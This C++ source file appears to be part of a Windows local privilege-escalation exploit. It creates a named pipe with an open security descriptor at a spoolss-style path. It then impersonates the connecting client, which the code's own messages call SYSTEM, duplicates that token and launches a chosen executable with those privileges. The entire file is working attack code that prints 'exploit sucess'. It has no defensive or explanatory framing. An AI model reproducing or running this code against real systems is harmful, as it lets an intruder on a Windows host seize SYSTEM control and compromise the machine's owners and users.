#include "pipeserver.h"

using namespace std;

wstring str2wstr(const std::string& str)
{
	wstring_convert<codecvt_utf8_utf16<wchar_t>> converter;
	return converter.from_bytes(str);
}

DWORD WINAPI regiesterPipe(LPVOID lpParameter)
{


	HANDLE hPipe;
	char buffer[1024];
	DWORD dwRead;
	HINSTANCE hinst;
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	HANDLE token;
	HANDLE newtoken;
	HANDLE ptoken;
	BYTE sd[SECURITY_DESCRIPTOR_MIN_LENGTH];

	SECURITY_ATTRIBUTES sa = { 0 };
	SECURITY_DESCRIPTOR st = { 0 };

	InitializeSecurityDescriptor(
		&st,
		SECURITY_DESCRIPTOR_REVISION);

	SetSecurityDescriptorDacl(
		&st,
		TRUE,
		NULL,
		FALSE);

	sa.bInheritHandle = false;
	sa.lpSecurityDescriptor = &st;
	sa.nLength = sizeof(sa);


	hPipe = CreateNamedPipe(TEXT("\\\\.\\pipe\\xxx\\pipe\\spoolss"),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,   // FILE_FLAG_FIRST_PIPE_INSTANCE is not needed but forces CreateNamedPipe(..) to fail if the pipe already exists...
		PIPE_UNLIMITED_INSTANCES,
		1024 * 16,
		1024 * 16,
		NMPWAIT_USE_DEFAULT_WAIT,
		&sa);


	while (hPipe != INVALID_HANDLE_VALUE)

	{
		if (ConnectNamedPipe(hPipe, NULL) != FALSE)   // wait for someone to connect to the pipe
		{
			printf("[+] create pip \\\\.\\pipe\\xxx\\pipe\\spoolss \n");
			if (ImpersonateNamedPipeClient(hPipe) == 0) {
				printf("[!] Error impersonating client %d\n", GetLastError());
				return 0;
			}
			if (!OpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &token)) {
				printf("[!] Error opening thread token %d\n", GetLastError());
				return 0;
			}
			/*if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &ptoken)) {
				printf("[!] Error opening process token %d\n", GetLastError());
				return 0;
			}*/
			if (!DuplicateTokenEx(token, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &newtoken)) {
				printf("[!] Error duplicating thread token %d\n", GetLastError());
				return 0;
			}
			printf("[*] Impersonated SYSTEM user successfully\n");

			using namespace std;
			string exepath = (char*)lpParameter;
			wstring wexepath = str2wstr(exepath);
			wexepath.c_str();

			if (!CreateProcessWithTokenW(newtoken, LOGON_NETCREDENTIALS_ONLY, wexepath.c_str(), NULL, NULL, NULL, NULL, NULL, NULL)) {
				printf("[!] CreateProcessWithToken  failed (%d), trying another method.\n", GetLastError());

				// Sometimes we fail above (as shown at meterpreter/source/extensions/stdapi/server/sys/process/process.c)
				if (!CreateProcessAsUserA(newtoken, exepath.c_str(), NULL, NULL, NULL, TRUE, 0, NULL, NULL, NULL, NULL)) {
					printf("[!] CreateProcessAsUser failed (%d).\n", GetLastError());

				}
			}
			printf("exploit sucess");
			printf("[*] All Done.. enjoy... press any key to finish\n");


			//getchar();

			return 0;

		}
		else {
			printf("[!] create pip \\\\.\\pipe\\xxx\\pipe\\spoolss failed\n");
		}

		DisconnectNamedPipe(hPipe);
	}

	return 0;
}
